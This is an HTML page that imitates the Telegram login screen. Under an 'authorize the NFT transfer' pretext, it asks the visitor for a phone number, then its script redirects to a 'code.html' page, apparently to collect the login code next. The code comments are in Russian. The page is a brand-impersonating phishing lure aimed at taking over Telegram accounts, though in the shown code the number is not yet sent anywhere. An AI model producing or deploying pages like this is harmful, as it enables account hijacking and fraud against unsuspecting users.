<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 40px 20px; }
        input { width: 100%; padding: 15px; background: #1c252f; border: 1px solid #2a3644; border-radius: 10px; color: #fff; margin-bottom: 20px; box-sizing: border-box; outline: none; }
        .btn { width: 100%; padding: 15px; background: #248bdf; border: none; border-radius: 10px; color: #fff; font-weight: bold; font-size: 16px; }
    </style>
</head>
<body>
    <h2>Log in to Telegram</h2>
    <p style="color: #8a99a8; font-size: 14px; margin-bottom: 30px;">Confirm your phone number to authorize the NFT transfer.</p>
    
    <input type="tel" id="phone" placeholder="+7 900 000-00-00">
    <button class="btn" onclick="validateLogin()">Next</button>

    <script>
        function validateLogin() {
            const phone = document.getElementById('phone').value;
            // Проверка: номер должен быть длиннее 6 символов
            if (phone.trim().length < 7) {
                alert("Please enter a valid phone number!");
            } else {
                // ПЕРЕНАПРАВЛЯЕМ ВРУЧНУЮ
                window.location.href = "code.html";
            }
        }
    </script>
</body>
</html>
